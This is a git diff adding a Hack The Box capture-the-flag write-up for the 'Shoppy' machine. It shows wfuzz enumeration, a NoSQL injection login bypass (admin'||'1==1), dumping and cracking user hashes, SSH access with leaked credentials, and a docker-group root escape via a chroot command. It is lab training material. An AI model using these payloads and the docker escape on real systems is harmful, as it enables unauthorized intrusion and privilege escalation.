@@ -1,4 +1,4 @@
-# Shoppy (NoSQL Injection and Docker Vulnerability)
+# Shoppy  (NoSQL Injection and Docker Vulnerability)
 
 - Difficulty: `Easy`
 
@@ -110,3 +110,220 @@ But after a few seconds when I visted the page again, there was a `login` form a
 
 ![shp-2](https://user-images.githubusercontent.com/87711310/211517930-916bcbf5-7e5e-4edd-b292-de5813be1ce8.png)
 
+However, I knew this was the website, we'll be needing to attack rightnow, because we would require a proper username and passwd to login into it
+
+So I decided to enumerate directories using `WFUZZ`.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shoppy]
+└─$ wfuzz -c -z file,/usr/share/wordlists/SecLists-master/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://shoppy.htb/FUZZ/" 
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://shoppy.htb/FUZZ/
+Total requests: 62284
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                    
+=====================================================================
+
+000000003:   302        0 L      4 W        28 Ch       "admin"                                                                                    
+000000039:   200        25 L     62 W       1074 Ch     "login"                                                                                    
+000000109:   302        0 L      4 W        28 Ch       "Admin"                                                                                    
+000000160:   200        25 L     62 W       1074 Ch     "Login"                                                                                    
+000000681:   302        0 L      4 W        28 Ch       "ADMIN" 
+```
+
+And I found couple of directories. 
+I visited the `/admin` directory and was redirected to `/login` directory where I was supposed to login. 
+
+I did not find any credentials up until now, so I was pretty much sure that I had to maybe use `SQL Injection` to bypass this `login` page
+
+So I started executing various payloads to bypass this login form and one thing which I noticed was that if I entered wrong credentials, I was immediately displayed an error message saying `Wrong Credentials` but when I entered  `'` (single-quote) the server took forever to authenticate it and atlast gave a `504` gateway time-out.
+
+![shp-3](https://user-images.githubusercontent.com/87711310/211531592-15570891-126e-4e94-a75b-7cf5491ac4c4.png)
+
+![shp-4](https://user-images.githubusercontent.com/87711310/211531585-414f938a-4802-4a03-b8ba-f3c0fd09205f.png)
+
+
+I tried various payloads and still couldn't find a way to bypass the login page.
+
+So I found out whats the matter and came to a conclusion that it is a NoSQL Injection rather than just a regular SQL Injection
+
+And from [hacktricks' website](https://book.hacktricks.xyz/pentesting-web/nosql-injection) I found out this following difference between SQL and NoSQL Injection payloads:
+
+```sql
+Normal sql: ' or 1=1-- -
+Mongo sql: ' || 1==1//    or    ' || 1==1%00
+```
+
+After a few more tries, I was able to figure out the payload for bypassing the login page.
+
+```
+admin'||'1==1
+```
+
+![shp-5](https://user-images.githubusercontent.com/87711310/211531600-dacd3f4c-8812-49fb-b55d-a91d30265766.png)
+
+After logging in, I was displyed a `Products of Shoppy App` page
+
+![shp-6](https://user-images.githubusercontent.com/87711310/211531972-2e2657f6-f741-4b82-89eb-e63352b22db7.png)
+
+I saw the `search users` button and searched for `admin` and a button to `download export` appeared on the screen. 
+
+On clicking it, I was redirected to a page that revealed credentials of `admin`.
+
+I took the credentials and tried to crack the hash but it was of no use.
+
+I suppose this hash was intentionally uncrackable and there might be another user or another crackable hash.
+
+To find this out I used the same `NoSql` injection payload in the `user search` and guess what? I found a user named `josh` and his credentials.
+
+![shp-7](https://user-images.githubusercontent.com/87711310/211533860-63c1d4ba-8f7f-4f21-a62a-c230641f00a5.png)
+
+Now, I took the credentials and passed them through CrackStation to crack the hash, and lucikly I found the password.
+
+
+![shp-8](https://user-images.githubusercontent.com/87711310/211534619-aae47d04-5c34-458b-bef4-cfdd504ff233.png)
+
+Now, I remember ahving viewed a `login` page on `mattermost.shoppy.htb`.
+
+So i visted it and tried to login using josh's credentials and Voila!! I'm in
+
+
+![shp-9](https://user-images.githubusercontent.com/87711310/211535242-ec0948db-181e-4925-971a-3600689caf2f.png)
+
+No redirected to the logged in page I found couple of things.
+
+![shp-10](https://user-images.githubusercontent.com/87711310/211535414-eb3bfe3b-44f0-46fe-99b4-080ff05f443b.png)
+
+There's another used named `jaeger`and they're talking about, installing docker, Learning C++ and having a `password-manager`
+
+Apart from these, I also found jaeger's credentials  that could be used to login through ssh 
+
+![shp-11](https://user-images.githubusercontent.com/87711310/211536029-cff28a02-54ae-466e-9fd2-ea202518629b.png)
+
+So I used the credentials and ssh'ed into the machine.
+
+And........ I'm in!!!
+
+```bash
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Shoppy]
+└─$ ssh jaeger@shoppy.htb
+The authenticity of host 'shoppy.htb (10.10.11.180)' can't be established.
+ED25519 key fingerprint is SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+8.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'shoppy.htb' (ED25519) to the list of known hosts.
+jaeger@shoppy.htb's password: 
+Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+jaeger@shoppy:~$ 
+```
+So time to get the user's flag
+ 
+```
+aeger@shoppy:~$ whoami
+jaeger
+jaeger@shoppy:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  ShoppyApp  shoppy_start.sh  Templates  user.txt  Videos
+jaeger@shoppy:~$ cat user.txt
+*****************************
+```
+
+## Privilege Escalation
+Entering `sudo -l` so see what can I run as sudo, I found out one command that could be ran as `sudo`
+
+```
+jaeger@shoppy:~$ sudo -l
+[sudo] password for jaeger: 
+Matching Defaults entries for jaeger on shoppy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User jaeger may run the following commands on shoppy:
+    (deploy) /home/deploy/password-manager
+
+````
+
+So Now I ran the following command and was immediately prompted to enter `deploy's` password which I did not have.
+
+So my next task was to find out `deploy's` credentials
+
+On viewing the contents of `/home/deploy/password-manager`, we get the password and entering the password retrieved to the same program with sudo privilege, reveals the password of the `deploy` user.
+
+![shp-12](https://user-images.githubusercontent.com/87711310/211542131-1d82165c-5ee0-4c1e-b9d3-d2adf9e07280.png)
+
+![shp-13](https://user-images.githubusercontent.com/87711310/211542710-68c74a8b-e38f-477c-a3ec-7cd6ef76f2b8.png)
+
+Once we retrieve the password for `deploy` we can ssh into the user
+
+```
+┌──(darshan㉿kali)-[~]
+└─$ ssh deploy@shoppy.htb
+deploy@shoppy.htb's password: 
+Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+$ whoami
+deploy
+$ 
+
+```
+ Trying to run `sudo` on deploy's account is not allowed
+ ```
+ $ sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for deploy: 
+Sorry, user deploy may not run sudo on shoppy.
+
+ ```
+ 
+ Now, looking at the `id` and `hostname` of the machine, reveals the presence of `docker`
+ 
+```
+$ id
+uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
+$ hostname
+shoppy
+$ hostname -I
+10.10.11.180 172.17.0.1 dead:beef::250:56ff:feb9:a1c 
+$ 
+
+```
+
+So i headed over to [GTFObins](https://gtfobins.github.io/gtfobins/docker/) to find a exploit for docker to gain root privileges and I found this simple exploit.
+
+```
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+```
+
+simply executing this command instantly gives us root access.
+
+```
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+# whoami
+root
+
+```
+
+And using this we can obtain the root flag.
